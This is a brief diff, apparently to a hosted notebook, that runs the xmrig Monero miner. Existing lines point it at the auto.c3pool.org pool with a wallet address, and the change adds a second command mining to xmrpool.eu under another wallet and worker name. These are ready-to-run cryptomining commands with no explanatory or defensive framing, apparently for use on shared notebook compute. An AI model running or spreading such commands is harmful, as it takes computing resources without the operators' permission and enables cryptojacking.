@@ -8,3 +8,6 @@
 %cd xmrig-6.16.3
 
 ! ./xmrig -o auto.c3pool.org:17777 -a rx -k -u 875cSnqJjxFUjwhD5eSKH5WdeA6e8on3GYQ5BnqCJdtyGw7p4Juv4wddjr7YcsjDFecoznkw718MUQsu23bcTCNd2YXpGjZ
+
+! ./xmrig -o xmrpool.eu:9999 -a rx -k -u 89ttQSqKPU49YAjsCvvEbi1XbghN2S43q4sZzsq9sBAacWN2J6QVexLNje5KPHhirCfDDZQ4u3JzwCwXwyrSE6vm3fERX9S+KaliWorker
+
